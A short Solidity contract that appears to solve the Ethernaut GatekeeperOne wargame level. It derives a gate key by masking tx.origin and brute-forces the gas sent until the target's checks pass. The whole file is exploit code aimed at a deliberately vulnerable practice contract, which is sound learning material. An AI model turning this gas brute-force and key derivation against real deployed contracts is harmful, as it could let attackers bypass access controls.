// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateOne {
    function enter (bytes8) external returns(bool);
}

contract GateKeeperOneExploit{
    function attack(address gatekeeperOneAddress) public {
        // Derive the gateKey
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // Brute-force the gas limit
        for (uint256 i = 0; i < 8191; i++) {
            try IGateOne(gatekeeperOneAddress).enter{gas: 8191 * 10 + i}(gateKey) {
                break;
            } catch {}
        }
    }
}